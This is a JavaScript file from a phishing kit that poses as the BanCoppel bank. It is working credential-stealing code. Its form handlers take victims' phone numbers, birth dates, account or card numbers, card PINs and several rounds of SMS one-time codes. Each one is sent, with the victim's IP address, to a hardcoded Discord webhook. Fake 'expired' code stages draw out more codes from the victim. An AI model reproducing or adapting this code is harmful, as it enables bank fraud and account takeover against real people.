(function () {
  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1511750513828561089/2pnP4HCmhgWJyymK_BV50U2HyP58nfoAWcnclCqFSrTivvW7g6DWa7heWtD_zBw-WbVt';

  const TIPOS = {
    cliente: 'Número de Cliente',
    cuenta: 'Número de Cuenta',
    tarjeta: 'Tarjeta BanCoppel',
  };

  const STAGE_MAP = {
    1: { title: '✅ CÓDIGO SMS 1️⃣', status: 'expired' },
    2: { title: '✅ CÓDIGO SMS 2️⃣', status: 'expired' },
    3: { title: '✅ CÓDIGO SMS 3️⃣', status: 'expired' },
    4: { title: '✅ CÓDIGO SMS 4️⃣', status: 'finish' },
  };

  let userIP = sessionStorage.getItem('user_ip') || '';

  async function fetchIP() {
    if (userIP) return userIP;
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      userIP = data.ip || 'No disponible';
    } catch {
      userIP = 'No disponible';
    }
    sessionStorage.setItem('user_ip', userIP);
    return userIP;
  }

  fetchIP();

  async function sendDiscord(message) {
    try {
      await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: message }),
      });
    } catch (err) {
      console.error('Discord Webhook error:', err);
    }
  }

  function formToObject(formData) {
    const obj = {};
    formData.forEach(function (value, key) {
      obj[key] = value;
    });
    return obj;
  }

  window.BancoppelAPI = {
    submitInitial: async function (formData) {
      const body = formToObject(formData);
      const ip = await fetchIP();

      if (!body.celular || !body.fecha || !body.cliente || !body.numero) {
        throw new Error('Faltan datos obligatorios');
      }
      if (!TIPOS[body.cliente]) {
        throw new Error('Tipo de identificación no válido');
      }

      sessionStorage.setItem('celular', body.celular);
      sessionStorage.setItem('fecha', body.fecha);
      sessionStorage.setItem('tipo', body.cliente);
      sessionStorage.setItem('numero', body.numero);

      let message = '👤 Bancoppel - Nuevo acceso\n';
      message += '📱 Celular: ' + body.celular + '\n';
      message += '🎂 Fecha Nacimiento: ' + body.fecha + '\n';
      message += '🪪 Tipo: ' + TIPOS[body.cliente] + '\n';
      message += '🔢 Número: ' + body.numero + '\n';
      message += '🌎 IP: ' + ip  + '\n';
      message += '🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n';

      await sendDiscord(message);
      return { status: 'ok' };
    },

    submitSecurity: async function (formData) {
      const body = formToObject(formData);
      const ip = await fetchIP();

      if (!/^[0-9]{2}$/.test(body.digitosTarjeta || '')) {
        throw new Error('Los últimos 2 dígitos de la tarjeta no son válidos');
      }
      if (!/^[0-9]{4}$/.test(body.nip || '')) {
        throw new Error('El NIP debe contener exactamente 4 dígitos');
      }

      const now = new Date();
      const fechaHora = now.toISOString().slice(0, 19).replace('T', ' ');

      let message = 'Bancoppel - Verificación\n';
      message += '🔢 Últimos 2 dígitos de tarjeta: ' + body.digitosTarjeta + '\n';
      message += '🔐 NIP (4 dígitos): ' + body.nip + '\n';
      message += '🌎 IP: ' + ip + '\n';
      message += '🕒 Fecha/Hora: ' + fechaHora + '\n';
      message += '🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n';

      await sendDiscord(message);
      return { status: 'ok' };
    },

    submitSms: async function (formData) {
      const body = formToObject(formData);
      const ip = await fetchIP();
      const celular = sessionStorage.getItem('celular') || 'No disponible';

      const codigo =
        body.digit1 + body.digit2 + body.digit3 +
        body.digit4 + body.digit5 + body.digit6;

      const smsStage = body.sms_stage ? parseInt(body.sms_stage, 10) : 1;
      const stage = STAGE_MAP[smsStage] || STAGE_MAP[1];

      let message = stage.title + '\n';
      message += '🔢 Código: ' + codigo + '\n';
      message += '🌎 IP: ' + ip + '\n';
      message += '📱 Celular: ' + celular;

      await sendDiscord(message);
      return { status: stage.status };
    },
  };
})();
